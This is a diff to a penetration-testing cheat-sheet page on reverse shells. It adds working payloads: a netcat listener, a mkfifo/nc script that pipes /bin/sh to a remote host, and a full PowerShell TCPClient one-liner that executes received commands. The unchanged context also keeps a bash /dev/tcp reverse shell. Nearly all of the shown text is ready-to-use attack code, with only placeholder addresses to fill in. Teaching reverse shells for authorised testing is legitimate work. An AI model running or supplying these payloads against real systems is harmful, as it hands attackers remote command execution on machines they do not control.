@@ -20,7 +20,7 @@ Reverse shells are commonly used in penetration testing and hacking scenarios to
 
 Here we have some scripts that can be used to create a reverse shell for various scenarios:
 
-## <mark style="color:orange;">Basic bash script</mark>
+## <mark style="color:orange;">Basic script</mark>
 
 * Establish a listening port on the host machine with Netcat
 
@@ -47,6 +47,52 @@ bash -i >& /dev/tcp/$ip/$port 0>&1
 * If you are using a VPN `$ip` is the IP assigned by the VPN instead of the host IP
 * Remember also to give execution permissions to the script
 {% endhint %}
+
+## <mark style="color:orange;">For Linux hosts</mark>
+
+* Listen with Netcat
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+nc -nvlp $port
+```
+{% endcode %}
+
+***
+
+* Use a script to send the remote shell to the listening port
+
+{% code title="RevShell-RM.sh" overflow="wrap" lineNumbers="true" %}
+```bash
+#!/bin/bash
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $port >/tmp/f
+```
+{% endcode %}
+
+{% hint style="info" %}
+Remember also to give execution permissions to the script
+{% endhint %}
+
+## <mark style="color:orange;">For Powershell on Windows hosts</mark>
+
+* Listen with Netcat
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+nc -nvlp $port
+```
+{% endcode %}
+
+***
+
+* The command for getting the shell
+
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$IP',$port);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
+{% endcode %}
 
 ## <mark style="color:orange;">For awscli</mark>
 
